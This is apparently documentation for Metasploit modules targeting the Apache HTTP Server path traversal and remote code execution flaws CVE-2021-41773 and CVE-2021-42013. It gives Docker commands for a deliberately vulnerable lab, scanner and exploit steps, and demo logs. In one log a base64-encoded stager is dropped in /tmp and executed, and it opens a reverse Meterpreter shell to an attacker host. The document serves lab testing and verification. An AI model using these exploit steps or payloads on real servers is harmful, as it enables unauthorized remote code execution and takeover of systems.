# CVE-2021-41773|CVE-2021-42013: Path Traversal Zero-Day in Apache HTTP Server Exploited

On October 5, the Apache HTTP Server Project patched CVE-2021-41773, a path traversal and file disclosure vulnerability in Apache HTTP Server, an open-source web server for Unix and Windows that is among the most widely used web servers. According to the security advisory, CVE-2021-41773 has been exploited in the wild as a zero-day. The vulnerability was disclosed to the Apache HTTP Server Project on September 29 by Ash Daulton and the cPanel Security Team. However, the advisory does not indicate when exploitation of CVE-2021-41773 was detected, but it stands to reason that the exploitation drove the expedited release of a patch.

See: https://fr.tenable.com/blog/cve-2021-41773-path-traversal-zero-day-in-apache-http-server-exploited

This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives. If files outside of these directories are not protected by the usual default configuration "require all denied", these requests can succeed. If CGI scripts are also enabled for these aliased pathes, this could allow for remote code execution. This issue only affects Apache 2.4.49 and Apache 2.4.50 and not earlier versions.

## Make your lab

#### Path Traversal

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

--or--

```
docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker stop CVE-2021-42013
docker start CVE-2021-42013
```

#### Remote Code Execution

```
docker run -dit --name CVE-2021-41773 -p 8080:80 -v /opt/apache2.4.49:/usr/local/apache2/htdocs httpd:2.4.49
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-41773 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-41773
docker start CVE-2021-41773
```

--or--

```
docker run -dit --name CVE-2021-42013 -p 8080:80 -v /opt/apache2.4.50:/usr/local/apache2/htdocs httpd:2.4.50
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/AllowOverride none/# AllowOverride None/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i "0,/denied/s/denied/granted/" conf/httpd.conf
docker exec -it CVE-2021-42013 sed -i -E "s|all denied|all granted|g; s|#(.* cgid_.*)|\1|g" conf/httpd.conf
docker stop CVE-2021-42013
docker start CVE-2021-42013
```

## Verification

List the steps needed to make sure this thing works

- [ ] Make your lab using commands above.

Use scanner module:

- [ ] Start `msfconsole`.
- [ ] `use auxiliary/scanner/http/apache_normalize_path`
- [ ] `set RHOSTS [IP]`
- [ ] `set RPORT 8080`
- [ ] `set SSL false`
- [ ] `run`

Use exploit module:

- [ ] Start `msfconsole`.
- [ ] `use exploit/multi/http/apache_normalize_path_rce`
- [ ] `set RHOSTS [IP]`
- [ ] `set RPORT 8080`
- [ ] `set SSL false`
- [ ] `set LHOST [IP]`
- [ ] `set VERBOSE true`
- [ ] `run`

## Demo

### CLI

```
msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apache_normalize_path_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > set target 1
target => 1
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rhosts 172.20.4.11
rhosts => 172.20.4.11
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
rport => 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
ssl => false
msf6 exploit(multi/http/apache_normalize_path_rce) > setg verbose true
verbose => true
msf6 exploit(multi/http/apache_normalize_path_rce) > set cmd uname -a
cmd => uname -a
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[+] uname -a
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.11:8080 - Attempt to exploit for CVE-2021-42013
[*] http://172.20.4.11:8080 - Generated payload: uname -a
[!] http://172.20.4.11:8080 - Dumping command output in response
Linux 184ef33f9859 5.14.0-1-amd64 #1 SMP Debian 5.14.6-3 (2021-09-28) x86_64 GNU/Linux

msf6 exploit(multi/http/apache_normalize_path_rce) > 
```

### Meterpreter

```
msf6 exploit(multi/http/apache_normalize_path_rce) > use exploit/multi/http/apache_normalize_path_rce
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/apache_normalize_path_rce) > setg RHOSTS 172.20.4.11
RHOSTS => 172.20.4.11
msf6 exploit(multi/http/apache_normalize_path_rce) > setg rport 8080
rport => 8080
msf6 exploit(multi/http/apache_normalize_path_rce) > setg ssl false
ssl => false
msf6 exploit(multi/http/apache_normalize_path_rce) > setg verbose true
verbose => true
msf6 exploit(multi/http/apache_normalize_path_rce) > set lhost 172.20.7.36
lhost => 172.20.7.36
msf6 exploit(multi/http/apache_normalize_path_rce) > run

[*] Started reverse TCP handler on 172.20.7.36:4444
[*] Using auxiliary/scanner/http/apache_normalize_path as check
[+] http://172.20.4.11:8080 - The target is vulnerable to CVE-2021-42013 (mod_cgi enabled).
[*] Scanned 1 of 1 hosts (100% complete)
[*] http://172.20.4.11:8080 - Attempt to exploit for CVE-2021-42013
[*] http://172.20.4.11:8080 - Sending linux/x64/meterpreter/reverse_tcp command payload
[*] http://172.20.4.11:8080 - Generated command payload: echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAASDH/aglYmbYQSInWTTHJaiJBWrIHDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXKwUByRRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== | base64 -d > /tmp/PJaT; chmod +x /tmp/PJaT; /tmp/PJaT; rm -f /tmp/PJaT
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3012548 bytes) to 172.20.4.11
[*] Meterpreter session 1 opened (172.20.7.36:4444 -> 172.20.4.11:48540) at 2021-10-08 13:58:13 +0400
[!] This exploit may require manual cleanup of '/tmp/PJaT' on the target

meterpreter >
```

## References

  1. <https://httpd.apache.org/security/vulnerabilities_24.html>
  2. <https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse>
  3. <https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-httpd-rce.yaml>
  4. <https://github.com/projectdiscovery/nuclei-templates/commit/9384dd235ec5107f423d930ac80055f2ce2bff74>
  5. <https://attackerkb.com/topics/1RltOPCYqE/cve-2021-41773/rapid7-analysis>
